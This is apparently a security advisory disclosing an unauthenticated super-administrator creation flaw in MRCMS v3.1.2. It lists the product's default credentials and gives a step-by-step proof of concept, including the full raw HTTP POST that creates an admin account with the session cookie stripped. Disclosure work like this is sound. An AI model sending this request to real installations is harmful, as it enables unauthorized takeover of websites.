## Unauthorized Super Administrator Addition in MRCMS v3.1.2


## **<font style="color:rgb(15, 17, 21);">Vulnerability Description</font>**

<font style="color:rgb(15, 17, 21);"></font>

<font style="color:rgb(15, 17, 21);">MRCMS version 3.1.2 contains an access control vulnerability that allows unauthenticated attackers to add super administrator accounts arbitrarily, leading to complete website compromise.</font>

## **<font style="color:rgb(15, 17, 21);">Vulnerability Analysis</font>**

Project Repository: https://github.com/wuweiit/mushroom

Affected Release: https://github.com/wuweiit/mushroom/releases/tag/v3.1.2

Default Credentials: admin / 1

The `save()` method in `src/main/java/org/marker/mushroom/controller/UserController.java` lacks proper authorization validation, enabling direct addition of super administrator accounts without authentication.

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770185185869-dddf007b-14f8-495c-a99a-69a54d4a5316.png)

<font style="color:rgb(0, 0, 0);background-color:rgb(252, 252, 252);"></font>



## **<font style="color:rgb(15, 17, 21);">Proof of Concept</font>**

**<font style="color:rgb(15, 17, 21);">Step 1:</font>**<font style="color:rgb(15, 17, 21);"> Navigate to the user management interface and click "Add User."</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770185429442-2a2439e3-e98a-4fdc-add3-f59dbffc44f7.png)

**<font style="color:rgb(15, 17, 21);">Step 2:</font>**<font style="color:rgb(15, 17, 21);"> Intercept the request using Burp Suite while adding an administrator account.</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770185478386-ee6a6a3e-4626-4306-a524-4a3aeb9f2b2a.png)

**<font style="color:rgb(15, 17, 21);">Step 3:</font>**<font style="color:rgb(15, 17, 21);"> Capture and analyze the following request packet:</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770185524525-ec4de5cc-c860-48e9-a969-638076de2439.png)

**<font style="color:rgb(15, 17, 21);">Step 4:</font>**<font style="color:rgb(15, 17, 21);"> Remove the authentication Cookie field from the captured request and resend it.</font>

```java
POST /admin/user/save.do HTTP/1.1
Host: localhost:8080
Content-Length: 65
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/admin/index.do
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

gid=1&nickname=test&name=test&pass=test&description=test&status=1
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770185565081-454ded40-9c36-4f48-b3a7-dfb002b38a46.png)

**<font style="color:rgb(15, 17, 21);">Step 5:</font>**<font style="color:rgb(15, 17, 21);"> Observe that the super administrator account is successfully created without authentication.</font>

**<font style="color:rgb(15, 17, 21);">Step 6:</font>**<font style="color:rgb(15, 17, 21);"> Refresh the user management page to verify the newly added super administrator account appears in the list.</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770185637644-2453a820-ad8e-4d8d-b1d6-7cc4a9ae3711.png)



